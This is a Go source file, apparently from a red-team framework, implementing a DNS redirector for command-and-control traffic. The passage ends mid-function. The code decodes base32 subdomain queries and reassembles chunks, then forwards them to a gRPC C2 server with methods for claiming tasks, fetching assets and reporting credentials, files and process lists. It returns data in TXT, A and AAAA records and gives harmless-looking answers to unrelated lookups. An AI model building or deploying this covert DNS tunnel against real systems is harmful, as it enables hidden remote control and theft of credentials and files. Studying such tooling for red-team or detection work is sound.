package dns

import (
	"context"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"log/slog"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
	"realm.pub/tavern/internal/redirectors"
)

const (
	// DNS protocol limits
	dnsHeaderSize  = 12 // Standard DNS header size
	maxLabelLength = 63 // Maximum bytes in a DNS label
	txtRecordType  = 16 // TXT record QTYPE
	aRecordType    = 1  // A record QTYPE
	aaaaRecordType = 28 // AAAA record QTYPE
	dnsClassIN     = 1  // Internet class
	defaultUDPPort = "53"
	convTimeout    = 15 * time.Minute // Conversation expiration

	// Protocol field sizes (base36 encoding)
	typeSize   = 1  // Packet type: i/d/e/f
	seqSize    = 5  // Sequence: 36^5 = 60,466,176 max chunks
	convIDSize = 12 // Conversation ID length
	headerSize = typeSize + seqSize + convIDSize

	// Packet types
	typeInit  = 'i' // Init: establish conversation
	typeData  = 'd' // Data: send chunk
	typeEnd   = 'e' // End: finalize and process
	typeFetch = 'f' // Fetch: retrieve response chunk

	// Response prefixes (TXT records)
	respOK      = "ok:" // Success with data
	respMissing = "m:"  // Missing chunks list
	respError   = "e:"  // Error message
	respChunked = "r:"  // Response chunked metadata

	// Response size limits (to fit in single UDP packet)
	maxDNSResponseSize   = 1400 // Conservative MTU limit
	maxResponseChunkSize = 1200 // Base32-encoded chunk size
)

func init() {
	redirectors.Register("dns", &Redirector{})
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Redirector handles DNS-based C2 communication
type Redirector struct {
	conversations sync.Map // conv_id -> *Conversation
	baseDomains   []string // Accepted base domains for queries
}

// GetConversation retrieves a conversation by ID (for testing)
func (r *Redirector) GetConversation(convID string) (*Conversation, bool) {
	val, ok := r.conversations.Load(convID)
	if !ok {
		return nil, false
	}
	return val.(*Conversation), true
}

// StoreConversation stores a conversation (for testing)
func (r *Redirector) StoreConversation(convID string, conv *Conversation) {
	r.conversations.Store(convID, conv)
}

// CleanupConversationsOnce runs cleanup logic once (for testing)
func (r *Redirector) CleanupConversationsOnce(timeout time.Duration) {
	now := time.Now()
	r.conversations.Range(func(key, value interface{}) bool {
		conv := value.(*Conversation)
		conv.mu.Lock()
		if now.Sub(conv.LastActivity) > timeout {
			r.conversations.Delete(key)
		}
		conv.mu.Unlock()
		return true
	})
}

// Conversation tracks state for a request-response exchange
type Conversation struct {
	mu           sync.Mutex
	ID           string         // Exported for testing
	MethodPath   string         // gRPC method path (exported for testing)
	TotalChunks  int            // Expected number of request chunks (exported for testing)
	ExpectedCRC  uint16         // CRC16 of complete request data (exported for testing)
	Chunks       map[int][]byte // Received request chunks (exported for testing)
	LastActivity time.Time      // Exported for testing

	// Response chunking (for large responses)
	ResponseData     []byte   // Exported for testing
	ResponseChunks   []string // Base32 encoded (TXT) or raw binary (A/AAAA) (exported for testing)
	ResponseCRC      uint16   // Exported for testing
	IsBinaryChunking bool     // true for A/AAAA, false for TXT (exported for testing)
}

func (r *Redirector) Redirect(ctx context.Context, listenOn string, upstream *grpc.ClientConn) error {
	listenAddr, domains, err := ParseListenAddr(listenOn)
	if err != nil {
		return fmt.Errorf("failed to parse listen address: %w", err)
	}

	if len(domains) == 0 {
		return fmt.Errorf("no base domains specified in listenOn parameter")
	}

	r.baseDomains = domains

	udpAddr, err := net.ResolveUDPAddr("udp", listenAddr)
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %w", err)
	}

	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on UDP: %w", err)
	}
	defer conn.Close()

	slog.Info("DNS redirector started", "listen_on", listenAddr, "base_domains", r.baseDomains)

	go r.cleanupConversations(ctx)

	buf := make([]byte, 4096)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			conn.SetReadDeadline(time.Now().Add(1 * time.Second))

			n, addr, err := conn.ReadFromUDP(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				slog.Error("failed to read UDP packet", "error", err)
				continue
			}

			go r.handleDNSQuery(ctx, conn, addr, buf[:n], upstream)
		}
	}
}

// ParseListenAddr extracts address and domain parameters from listenOn string
// Format: "addr:port?domain=example.com&domain=other.com"
func ParseListenAddr(listenOn string) (string, []string, error) {
	parts := strings.SplitN(listenOn, "?", 2)
	addr := parts[0]

	if !strings.Contains(addr, ":") {
		addr = net.JoinHostPort(addr, defaultUDPPort)
	}

	if len(parts) == 1 {
		return addr, nil, nil
	}

	queryParams := parts[1]
	domains := []string{}

	for _, param := range strings.Split(queryParams, "&") {
		kv := strings.SplitN(param, "=", 2)
		if len(kv) != 2 {
			continue
		}

		key := kv[0]
		value := kv[1]

		if key == "domain" && value != "" {
			decoded, err := url.QueryUnescape(value)
			if err != nil {
				return "", nil, fmt.Errorf("failed to decode domain value: %w", err)
			}
			domains = append(domains, decoded)
		}
	}

	return addr, domains, nil
}

func (r *Redirector) cleanupConversations(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			now := time.Now()
			r.conversations.Range(func(key, value interface{}) bool {
				conv := value.(*Conversation)
				conv.mu.Lock()
				if now.Sub(conv.LastActivity) > convTimeout {
					r.conversations.Delete(key)
					slog.Debug("conversation expired", "conv_id", conv.ID)
				}
				conv.mu.Unlock()
				return true
			})
		}
	}
}

func (r *Redirector) handleDNSQuery(ctx context.Context, conn *net.UDPConn, addr *net.UDPAddr, query []byte, upstream *grpc.ClientConn) {
	if len(query) < dnsHeaderSize {
		slog.Debug("query too short")
		return
	}

	transactionID := binary.BigEndian.Uint16(query[0:2])

	domain, queryType, err := r.parseDomainNameAndType(query[dnsHeaderSize:])
	if err != nil {
		slog.Debug("failed to parse domain", "error", err)
		return
	}

	// Normalize domain to lowercase for case-insensitive matching
	domain = strings.ToLower(domain)

	slog.Debug("received DNS query", "domain", domain, "query_type", queryType, "from", addr.String())

	domainParts := strings.Split(domain, ".")
	var subdomainParts []string
	var matchedBaseDomain string

	for _, baseDomain := range r.baseDomains {
		baseDomainParts := strings.Split(baseDomain, ".")

		if len(domainParts) <= len(baseDomainParts) {
			continue
		}

		domainSuffix := domainParts[len(domainParts)-len(baseDomainParts):]
		matched := true
		for i, part := range baseDomainParts {
			if !strings.EqualFold(part, domainSuffix[i]) {
				matched = false
				break
			}
		}

		if matched {
			subdomainParts = domainParts[:len(domainParts)-len(baseDomainParts)]
			matchedBaseDomain = baseDomain
			break
		}
	}

	if matchedBaseDomain == "" {
		slog.Debug("domain doesn't match any configured base domains", "domain", domain, "base_domains", r.baseDomains)
		r.sendErrorResponse(conn, addr, transactionID)
		return
	}

	if len(subdomainParts) < 1 {
		slog.Debug("no subdomain found", "domain", domain, "matched_base_domain", matchedBaseDomain)
		r.sendErrorResponse(conn, addr, transactionID)
		return
	}

	// Reassemble all subdomain labels (they form a base32-encoded packet)
	fullSubdomain := strings.Join(subdomainParts, "")

	// Decode base32 to get raw packet bytes
	packetBytes, err := decodeBase32(fullSubdomain)
	if err != nil {
		// For A/AAAA queries, this is likely a DNS resolver doing lookups (not C2 traffic)
		// Return a benign response instead of an error to avoid polluting logs
		if queryType == aRecordType || queryType == aaaaRecordType {
			slog.Debug("ignoring non-C2 resolver query", "query_type", queryType, "domain", domain)
			r.sendBenignResponse(conn, addr, transactionID, domain, queryType)
			return
		}
		slog.Debug("failed to decode base32 subdomain", "error", err, "subdomain", fullSubdomain[:min(len(fullSubdomain), 50)])
		r.sendErrorResponse(conn, addr, transactionID)
		return
	}

	// Parse packet: [type:1][seq:5][convid:12][data...]
	if len(packetBytes) < headerSize {
		// For A/AAAA queries with invalid packet structure, likely resolver lookups
		if queryType == aRecordType || queryType == aaaaRecordType {
			slog.Debug("ignoring malformed resolver query", "query_type", queryType, "domain", domain, "size", len(packetBytes))
			r.sendBenignResponse(conn, addr, transactionID, domain, queryType)
			return
		}
		slog.Debug("packet too short after decoding", "size", len(packetBytes), "min_size", headerSize)
		r.sendErrorResponse(conn, addr, transactionID)
		return
	}

	pktType := rune(packetBytes[0])
	seqStr := string(packetBytes[typeSize : typeSize+seqSize])
	convID := string(packetBytes[typeSize+seqSize : headerSize])
	data := packetBytes[headerSize:] // Keep as []byte, don't convert to string

	slog.Debug("parsed packet", "type", string(pktType), "seq_str", seqStr, "conv_id", convID, "data_len", len(data), "total_packet_len", len(packetBytes))

	seq, err := decodeSeq(seqStr)
	if err != nil {
		// For A/AAAA queries, invalid sequence likely means resolver lookup
		if queryType == aRecordType || queryType == aaaaRecordType {
			slog.Debug("ignoring resolver query with invalid sequence", "query_type", queryType, "domain", domain)
			r.sendBenignResponse(conn, addr, transactionID, domain, queryType)
			return
		}
		slog.Debug("invalid sequence", "seq", seqStr, "error", err)
		r.sendErrorResponse(conn, addr, transactionID)
		return
	}

	var responseData []byte
	switch pktType {
	case typeInit:
		responseData, err = r.HandleInitPacket(convID, string(data))
	case typeData:
		responseData, err = r.HandleDataPacket(convID, seq, data)
	case typeEnd:
		responseData, err = r.HandleEndPacket(ctx, upstream, convID, seq, queryType)
	case typeFetch:
		responseData, err = r.HandleFetchPacket(convID, seq)
	default:
		err = fmt.Errorf("unknown packet type: %c", pktType)
	}

	if err != nil {
		slog.Error("failed to handle packet", "type", string(pktType), "error", err)
		errorResp := fmt.Sprintf("%s%s", respError, err.Error())
		r.sendDNSResponse(conn, addr, transactionID, domain, []byte(errorResp), queryType)
		return
	}

	var maxCapacity int
	switch queryType {
	case txtRecordType:
		maxCapacity = maxDNSResponseSize
	case aRecordType:
		maxCapacity = 4
	case aaaaRecordType:
		maxCapacity = 16
	default:
		maxCapacity = maxDNSResponseSize
	}

	slog.Debug("checking if chunking needed", "query_type", queryType, "response_size", len(responseData),
		"max_capacity", maxCapacity, "packet_type", string(pktType))

	if queryType != txtRecordType && len(responseData) > maxCapacity && (pktType == typeEnd || pktType == typeInit) {
		var conv *Conversation
		var actualConvID string

		if pktType == typeInit {
			actualConvID = convID
			conv = &Conversation{
				ID:               actualConvID,
				LastActivity:     time.Now(),
				ResponseData:     responseData,
				ResponseCRC:      CalculateCRC16(responseData),
				IsBinaryChunking: true,
			}
			r.conversations.Store(actualConvID, conv)
		} else {
			convVal, ok := r.conversations.Load(convID)
			if !ok {
				slog.Error("conversation not found for chunking", "conv_id", convID)
				r.sendDNSResponse(conn, addr, transactionID, domain, responseData, queryType)
				return
			}
			conv = convVal.(*Conversation)
			actualConvID = convID
		}

		conv.mu.Lock()

		conv.ResponseData = responseData
		conv.ResponseCRC = CalculateCRC16(responseData)
		conv.IsBinaryChunking = true

		conv.ResponseChunks = nil
		for i := 0; i < len(responseData); i += maxCapacity {
			end := i + maxCapacity
			if end > len(responseData) {
				end = len(responseData)
			}
			conv.ResponseChunks = append(conv.ResponseChunks, string(responseData[i:end]))
		}

		conv.mu.Unlock()

		var response []byte
		if maxCapacity <= 4 {
			if len(conv.ResponseChunks) > 65535 {
				slog.Error("too many chunks for binary format", "chunks", len(conv.ResponseChunks))
				r.sendErrorResponse(conn, addr, transactionID)
				return
			}
			response = make([]byte, 4)
			response[0] = 0xFF
			response[1] = byte(len(conv.ResponseChunks) >> 8)
			response[2] = byte(len(conv.ResponseChunks) & 0xFF)
			response[3] = byte(conv.ResponseCRC & 0xFF)

			slog.Debug("using compact binary chunked indicator",
				"chunks", len(conv.ResponseChunks), "crc_low", response[3])
		} else {
			responseStr := fmt.Sprintf("%s%s:%s", respChunked, encodeSeq(len(conv.ResponseChunks)), EncodeBase36CRC(int(conv.ResponseCRC)))
			response = []byte(responseStr)
		}

		slog.Debug("response too large for record type, using multi-query chunking",
			"conv_id", actualConvID, "packet_type", string(pktType), "data_size", len(responseData),
			"max_capacity", maxCapacity, "query_type", queryType, "chunks", len(conv.ResponseChunks),
			"indicator_size", len(response))

		r.sendDNSResponse(conn, addr, transactionID, domain, response, queryType)
		return
	}

	success := r.sendDNSResponse(conn, addr, transactionID, domain, responseData, queryType)

	if success && pktType == typeEnd && !strings.HasPrefix(string(responseData), respChunked) {
		r.conversations.Delete(convID)
		slog.Debug("conversation completed and cleaned up", "conv_id", convID)
	}
}

// HandleInitPacket processes init packet and creates conversation
// Init payload format: [method_code:2][total_chunks:5][crc:4]
func (r *Redirector) HandleInitPacket(tempConvID string, data string) ([]byte, error) {
	slog.Debug("handling init packet", "temp_conv_id", tempConvID, "data", data, "data_len", len(data))

	// Payload: method(2) + chunks(5) + crc(4) = 11 chars
	if len(data) < 11 {
		slog.Debug("init payload too short", "expected", 11, "got", len(data))
		return nil, fmt.Errorf("init payload too short: expected 11, got %d", len(data))
	}

	methodCode := data[:2]
	totalChunksStr := data[2:7]
	crcStr := data[7:11]

	slog.Debug("parsing init payload", "method_code", methodCode, "chunks_str", totalChunksStr, "crc_str", crcStr)

	totalChunks, err := decodeSeq(totalChunksStr)
	if err != nil {
		return nil, fmt.Errorf("invalid total chunks: %w", err)
	}

	// CRC is base36-encoded (4 chars)
	expectedCRC, err := decodeBase36CRC(crcStr)
	if err != nil {
		return nil, fmt.Errorf("invalid CRC: %w", err)
	}

	methodPath := codeToMethod(methodCode)
	realConvID := generateConvID()

	conv := &Conversation{
		ID:           realConvID,
		MethodPath:   methodPath,
		TotalChunks:  totalChunks,
		ExpectedCRC:  uint16(expectedCRC),
		Chunks:       make(map[int][]byte),
		LastActivity: time.Now(),
	}

	r.conversations.Store(realConvID, conv)

	slog.Debug("created conversation", "conv_id", realConvID, "method", methodPath, "total_chunks", totalChunks)

	return []byte(realConvID), nil
}

// HandleDataPacket stores a data chunk in the conversation
func (r *Redirector) HandleDataPacket(convID string, seq int, data []byte) ([]byte, error) {
	convVal, ok := r.conversations.Load(convID)
	if !ok {
		return nil, fmt.Errorf("unknown conversation: %s", convID)
	}

	conv := convVal.(*Conversation)
	conv.mu.Lock()
	defer conv.mu.Unlock()

	conv.LastActivity = time.Now()

	// Ignore chunks beyond declared total (duplicates/retransmissions)
	if seq >= conv.TotalChunks {
		slog.Warn("ignoring chunk beyond expected total", "conv_id", convID, "seq", seq, "expected_total", conv.TotalChunks)
		return []byte{}, nil
	}

	conv.Chunks[seq] = data

	dataPreview := ""
	if len(data) > 0 {
		previewLen := min(len(data), 16)
		dataPreview = fmt.Sprintf("%x", data[:previewLen])
	}

	slog.Debug("received chunk", "conv_id", convID, "seq", seq, "chunk_len", len(data), "total_received", len(conv.Chunks), "expected_total", conv.TotalChunks, "data_preview", dataPreview)

	// Return acknowledgment
	return []byte{}, nil
}

// HandleEndPacket processes end packet and returns server response
func (r *Redirector) HandleEndPacket(ctx context.Context, upstream *grpc.ClientConn, convID string, lastSeq int, queryType uint16) ([]byte, error) {
	convVal, ok := r.conversations.Load(convID)
	if !ok {
		return nil, fmt.Errorf("unknown conversation: %s", convID)
	}

	conv := convVal.(*Conversation)
	conv.mu.Lock()
	defer conv.mu.Unlock()

	conv.LastActivity = time.Now()

	slog.Debug("end packet received", "conv_id", convID, "last_seq", lastSeq, "chunks_received", len(conv.Chunks))

	// Check for missing chunks
	var missing []int
	for i := 0; i < conv.TotalChunks; i++ {
		if _, ok := conv.Chunks[i]; !ok {
			missing = append(missing, i)
		}
	}

	if len(missing) > 0 {
		// Return missing chunks list
		missingStrs := make([]string, len(missing))
		for i, seq := range missing {
			missingStrs[i] = encodeSeq(seq)
		}
		response := fmt.Sprintf("%s%s", respMissing, strings.Join(missingStrs, ","))

		slog.Debug("returning missing chunks", "conv_id", convID, "count", len(missing), "missing_seqs", missing)

		return []byte(response), nil
	}

	// Reassemble data (chunks now contain raw binary, not base32)
	requestData := r.reassembleChunks(conv.Chunks, conv.TotalChunks)

	// Sanity check: ensure we have exactly the right number of chunks
	if len(conv.Chunks) != conv.TotalChunks {
		slog.Error("chunk count mismatch", "conv_id", convID, "chunks_in_map", len(conv.Chunks), "total_chunks_declared", conv.TotalChunks)
		return []byte(respError + fmt.Sprintf("chunk_count_mismatch: have %d, expected %d", len(conv.Chunks), conv.TotalChunks)), nil
	}

	slog.Debug("reassembled data", "conv_id", convID, "bytes_len", len(requestData))

	// Verify CRC (chunks already contain raw decrypted data)
	actualCRC := CalculateCRC16(requestData)
	expectedCRC := uint16(conv.ExpectedCRC)

	slog.Debug("CRC check", "conv_id", convID, "expected", expectedCRC, "actual", actualCRC, "data_len", len(requestData), "chunks_received", len(conv.Chunks), "chunks_expected", conv.TotalChunks)

	if actualCRC != expectedCRC {
		errMsg := fmt.Sprintf("CRC mismatch: expected %d, got %d", expectedCRC, actualCRC)
		slog.Error(errMsg, "conv_id", convID, "data_len", len(requestData), "chunks_map_size", len(conv.Chunks), "total_chunks_declared", conv.TotalChunks)
		return []byte(respError + "invalid_crc"), nil
	}
	slog.Debug("reassembled and validated data", "conv_id", convID, "bytes", len(requestData))

	// Forward to upstream gRPC server
	responseData, err := r.forwardToUpstream(ctx, upstream, conv.MethodPath, requestData)
	if err != nil {
		return nil, fmt.Errorf("failed to forward to upstream: %w", err)
	}

	// Determine if we need to base32-encode the response
	// For A/AAAA records that will use binary chunking, return raw binary
	// For TXT records, return base32-encoded with "ok:" prefix
	useBinaryChunking := (queryType == aRecordType || queryType == aaaaRecordType)

	if useBinaryChunking {
		// Return raw binary data for A/AAAA records
		// The main handler will chunk this if needed
		return responseData, nil
	}

	// For TXT records, use base32 encoding
	encodedResponse := encodeBase32(responseData)
	responseWithPrefix := respOK + encodedResponse

	if len(responseWithPrefix) > maxDNSResponseSize {
		// Response too large - chunk it
		slog.Debug("response too large, chunking", "conv_id", convID, "size", len(responseData), "encoded_size", len(encodedResponse))

		// Store response data in conversation
		conv.ResponseData = responseData
		conv.ResponseCRC = CalculateCRC16(responseData) // Use full 16-bit CRC

		// Chunk the encoded response
		conv.ResponseChunks = nil
		for i := 0; i < len(encodedResponse); i += maxResponseChunkSize {
			end := i + maxResponseChunkSize
			if end > len(encodedResponse) {
				end = len(encodedResponse)
			}
			conv.ResponseChunks = append(conv.ResponseChunks, encodedResponse[i:end])
		}

		// Return chunked response indicator: "r:[num_chunks]:[crc]"
		response := fmt.Sprintf("%s%s:%s", respChunked, encodeSeq(len(conv.ResponseChunks)), EncodeBase36CRC(int(conv.ResponseCRC)))
		slog.Debug("returning chunked response indicator", "conv_id", convID, "chunks", len(conv.ResponseChunks), "crc", conv.ResponseCRC)
		return []byte(response), nil
	}

	return []byte(responseWithPrefix), nil
}

// HandleFetchPacket serves a response chunk to the client
func (r *Redirector) HandleFetchPacket(convID string, chunkSeq int) ([]byte, error) {
	convVal, ok := r.conversations.Load(convID)
	if !ok {
		return nil, fmt.Errorf("unknown conversation: %s", convID)
	}

	conv := convVal.(*Conversation)
	conv.mu.Lock()
	defer conv.mu.Unlock()

	conv.LastActivity = time.Now()

	// Check if this is the final fetch (cleanup request)
	if chunkSeq >= len(conv.ResponseChunks) {
		// Client is done fetching - clean up conversation
		r.conversations.Delete(convID)
		slog.Debug("conversation completed and cleaned up", "conv_id", convID)
		return []byte(respOK), nil
	}

	// Return the requested chunk
	if chunkSeq < 0 || chunkSeq >= len(conv.ResponseChunks) {
		return nil, fmt.Errorf("invalid chunk sequence: %d (total: %d)", chunkSeq, len(conv.ResponseChunks))
	}

	chunk := conv.ResponseChunks[chunkSeq]
	slog.Debug("serving response chunk", "conv_id", convID, "seq", chunkSeq, "size", len(chunk), "is_binary", conv.IsBinaryChunking)

	// For binary chunking (A/AAAA), return raw bytes
	// For text chunking (TXT), return "ok:" prefix + base32 data
	if conv.IsBinaryChunking {
		return []byte(chunk), nil
	}
	return []byte(respOK + chunk), nil
}

// reassembleChunks combines chunks in order
func (r *Redirector) reassembleChunks(chunks map[int][]byte, totalChunks int) []byte {
	var result []byte
	for i := 0; i < totalChunks; i++ {
		if chunk, ok := chunks[i]; ok {
			slog.Debug("reassembling chunk", "seq", i, "chunk_len", len(chunk), "total_so_far", len(result))
			result = append(result, chunk...)
		} else {
			// This should never happen since we check for missing chunks first
			slog.Error("CRITICAL: Missing chunk during reassembly", "seq", i, "total_chunks", totalChunks, "chunks_present", len(chunks))
		}
	}
	slog.Debug("reassembly complete", "final_len", len(result), "total_chunks", totalChunks)
	return result
}

// forwardToUpstream sends request to gRPC server and returns response
func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.ClientConn, methodPath string, requestData []byte) ([]byte, error) {
	// Create gRPC stream
	md := metadata.New(map[string]string{})
	ctx = metadata.NewOutgoingContext(ctx, md)

	stream, err := upstream.NewStream(ctx, &grpc.StreamDesc{
		StreamName:    methodPath,
		ServerStreams: true,
		ClientStreams: true,
	}, methodPath, grpc.CallContentSubtype("raw"))
	if err != nil {
		return nil, fmt.Errorf("failed to create stream: %w", err)
	}

	// Determine request/response streaming types
	isClientStreaming := methodPath == "/c2.C2/ReportFile"
	isServerStreaming := methodPath == "/c2.C2/FetchAsset"

	if isClientStreaming {
		// For client streaming, parse length-prefixed chunks and send individually
		offset := 0
		chunkCount := 0
		for offset < len(requestData) {
			if offset+4 > len(requestData) {
				break
			}

			// Read 4-byte length prefix
			msgLen := binary.BigEndian.Uint32(requestData[offset : offset+4])
			offset += 4

			if offset+int(msgLen) > len(requestData) {
				return nil, fmt.Errorf("invalid chunk length: %d bytes at offset %d", msgLen, offset)
			}

			// Send individual chunk
			chunk := requestData[offset : offset+int(msgLen)]
			if err := stream.SendMsg(chunk); err != nil {
				return nil, fmt.Errorf("failed to send chunk %d: %w", chunkCount, err)
			}

			offset += int(msgLen)
			chunkCount++
		}

		slog.Debug("sent client streaming chunks", "method", methodPath, "chunks", chunkCount)
	} else {
		// For unary/server-streaming, send the request as-is
		if err := stream.SendMsg(requestData); err != nil {
			return nil, fmt.Errorf("failed to send message: %w", err)
		}
	}

	if err := stream.CloseSend(); err != nil {
		return nil, fmt.Errorf("failed to close send: %w", err)
	}

	// Receive response(s)
	var responseData []byte
	responseCount := 0
	for {
		var msg []byte
		err := stream.RecvMsg(&msg)
		if err != nil {
			// Check if EOF (normal end of stream)
			if stat, ok := status.FromError(err); ok {
				if stat.Code() == codes.OK || stat.Code() == codes.Unavailable {
					break
				}
			}
			// For streaming responses, we may receive multiple messages
			if err.Error() == "EOF" {
				break
			}
			return nil, fmt.Errorf("failed to receive message: %w", err)
		}

		// Append message data
		if len(msg) > 0 {
			if isServerStreaming {
				// For server streaming, add 4-byte length prefix before each response chunk
				lengthPrefix := make([]byte, 4)
				binary.BigEndian.PutUint32(lengthPrefix, uint32(len(msg)))
				responseData = append(responseData, lengthPrefix...)
				responseData = append(responseData, msg...)
			} else {
				// For unary, just append the response as-is (no length prefix)
				responseData = append(responseData, msg...)
			}
			responseCount++
		}
	}

	slog.Debug("received responses", "method", methodPath, "count", responseCount, "total_bytes", len(responseData))

	return responseData, nil
}

// parseDomainNameAndType extracts both domain name and query type from DNS question
func (r *Redirector) parseDomainNameAndType(data []byte) (string, uint16, error) {
	var labels []string
	offset := 0

	// Parse domain name
	for offset < len(data) {
		length := int(data[offset])
		if length == 0 {
			offset++
			break
		}
		offset++

		if offset+length > len(data) {
			return "", 0, fmt.Errorf("invalid label length")
		}

		label := string(data[offset : offset+length])
		labels = append(labels, label)
		offset += length
	}

	// Parse query type (2 bytes after domain name)
	if offset+2 > len(data) {
		return "", 0, fmt.Errorf("query too short for type field")
	}

	queryType := binary.BigEndian.Uint16(data[offset : offset+2])
	domain := strings.Join(labels, ".")

	return domain, queryType, nil
}

// sendDNSResponse sends a DNS response with the appropriate record type
// Returns true if response was sent successfully, false if it failed
func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, transactionID uint16, domain string, data []byte, queryType uint16) bool {
	response := make([]byte, 0, 512)

	// DNS Header
	response = append(response, byte(transactionID>>8), byte(transactionID))
	response = append(response, 0x81, 0x80) // Flags: Response, no error
	response = append(response, 0x00, 0x01) // Questions: 1
	response = append(response, 0x00, 0x01) // Answers: 1
	response = append(response, 0x00, 0x00) // Authority RRs: 0
	response = append(response, 0x00, 0x00) // Additional RRs: 0

	// Question section (echo the question)
	for _, label := range strings.Split(domain, ".") {
		if len(label) == 0 {
			continue
		}
		response = append(response, byte(len(label)))
		response = append(response, []byte(label)...)
	}
	response = append(response, 0x00)                   // End of domain
	response = append(response, 0x00, byte(queryType))  // Type: echo query type
	response = append(response, 0x00, byte(dnsClassIN)) // Class: IN

	// Answer section
	// Name (pointer to question)
	response = append(response, 0xC0, 0x0C)
	// Type: echo query type
	response = append(response, 0x00, byte(queryType))
	// Class: IN
	response = append(response, 0x00, byte(dnsClassIN))
	// TTL: 60 seconds
	response = append(response, 0x00, 0x00, 0x00, 0x3C)

	// Build RDATA based on query type
	var rdata []byte

	switch queryType {
	case txtRecordType:
		// TXT record: split data into 255-byte chunks
		txtData := data
		var txtChunks [][]byte
		for len(txtData) > 0 {
			chunkSize := len(txtData)
			if chunkSize > 255 {
				chunkSize = 255
			}
			txtChunks = append(txtChunks, txtData[:chunkSize])
			txtData = txtData[chunkSize:]
		}

		// If no data, add an empty TXT string
		if len(txtChunks) == 0 {
			txtChunks = append(txtChunks, []byte{})
		}

		// Build TXT RDATA
		for _, chunk := range txtChunks {
			rdata = append(rdata, byte(len(chunk)))
			rdata = append(rdata, chunk...)
		}

	case aRecordType:
		// Pad to 4 bytes (data already validated to fit)
		rdata = make([]byte, 4)
		copy(rdata, data)

	case aaaaRecordType:
		// Pad to 16 bytes (data already validated to fit)
		rdata = make([]byte, 16)
		copy(rdata, data)

	default:
		// Unsupported record type, fallback to TXT
		slog.Warn("unsupported query type, using TXT", "query_type", queryType)
		rdata = []byte{byte(len(data))}
		rdata = append(rdata, data...)
	}

	// RDLENGTH
	response = append(response, byte(len(rdata)>>8), byte(len(rdata)))
	// RDATA
	response = append(response, rdata...)

	// Send response
	_, err := conn.WriteToUDP(response, addr)
	if err != nil {
		slog.Error("failed to send DNS response", "error", err)
		return false
	}
	return true
}

// sendErrorResponse sends a DNS error response
func (r *Redirector) sendErrorResponse(conn *net.UDPConn, addr *net.UDPAddr, transactionID uint16) {
	response := make([]byte, dnsHeaderSize)
	binary.BigEndian.PutUint16(response[0:2], transactionID)
	response[2] = 0x81
	response[3] = 0x83 // RCODE: Name Error

	conn.WriteToUDP(response, addr)
}

// sendBenignResponse sends a benign DNS response for resolver queries
// Returns 127.0.0.1 for A, ::1 for AAAA, empty TXT for others
func (r *Redirector) sendBenignResponse(conn *net.UDPConn, addr *net.UDPAddr, transactionID uint16, domain string, queryType uint16) {
	var data []byte
	switch queryType {
	case aRecordType:
		data = []byte{127, 0, 0, 1} // localhost
	case aaaaRecordType:
		data = make([]byte, 16) // ::1
		data[15] = 1
	default:
		data = []byte{} // empty response
	}
	r.sendDNSResponse(conn, addr, transactionID, domain, data, queryType)
}

// generateConvID generates a random conversation ID
func generateConvID() string {
	const chars = "0123456789abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, convIDSize)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

// codeToMethod maps 2-character method code to gRPC path
// Codes: ct=ClaimTasks, fa=FetchAsset, rc=ReportCredential,
//
//	rf=ReportFile, rp=ReportProcessList, rt=ReportTaskOutput
func codeToMethod(code string) string {
	methods := map[string]string{
		"ct": "/c2.C2/ClaimTasks",
		"fa": "/c2.C2/FetchAsset",
		"rc": "/c2.C2/ReportCredential",
		"rf": "/c2.C2/ReportFile",
		"rp": "/c2.C2/ReportProcessList",
		"rt": "/c2.C2/ReportTaskOutput",
	}

	if path, ok := methods[code]; ok {
		return path
	}

	return "/c2.C2/ClaimTasks"
}

// encodeBase36 encodes an integer to base36 string with specified number of digits
func encodeBase36(value int, digits int) string {
	const base36 = "0123456789abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, digits)
	for i := digits - 1; i >= 0; i-- {
		result[i] = base36[value%36]
		value /= 36
	}
	return string(result)
}

// decodeBase36 decodes a base36 string to an integer
func decodeBase36(encoded string) (int, error) {
	val := func(c byte) (int, error) {
		switch {
		case c >= '0' && c <= '9':
			return int(c - '0'), nil
		case c >= 'a' && c <= 'z':
			return int(c-'a') + 10, nil
		default:
			return 0, fmt.Errorf("invalid base36 character: %c", c)
		}
	}

	result := 0
	for _, c := range []byte(encoded) {
		digit, err := val(c)
		if err != nil {
			return 0, err
		}
		result = result*36 + digit
	}
	return result, nil
}

// encodeSeq encodes sequence number to 5-digit base36 (max: 60,466,175)
func encodeSeq(seq int) string {
	return encodeBase36(seq, 5)
}

// decodeSeq decodes 5-character base36 sequence number
func decodeSeq(encoded string) (int, error) {
	if len(encoded) != 5 {
		return 0, fmt.Errorf("invalid sequence length: expected 5, got %d", len(encoded))
	}
	return decodeBase36(encoded)
}

// EncodeBase36CRC encodes CRC16 to 4-digit base36 (range: 0-1,679,615 covers 0-65,535)
func EncodeBase36CRC(crc int) string {
	return encodeBase36(crc, 4)
}

// decodeBase36CRC decodes 4-character base36 CRC value
func decodeBase36CRC(encoded string) (int, error) {
	if len(encoded) != 4 {
		return 0, fmt.Errorf("invalid CRC length: expected 4, got %d", len(encoded))
	}
	return decodeBase36(encoded)
}

// CalculateCRC16 computes CRC16-CCITT checksum (polynomial 0x1021, init 0xFFFF)
func CalculateCRC16(data []byte) uint16 {
	var crc uint16 = 0xFFFF
	for _, b := range data {
		crc ^= uint16(b) << 8
		for i := 0; i < 8; i++ {
			if (crc & 0x8000) != 0 {
				crc = (crc << 1) ^ 0x1021
			} else {
				crc <<= 1
			}
		}
	}
	return crc
}

// encodeBase32 encodes data to lowercase base32 without padding
func encodeBase32(data []byte) string {
	if len(data) == 0 {
		return ""
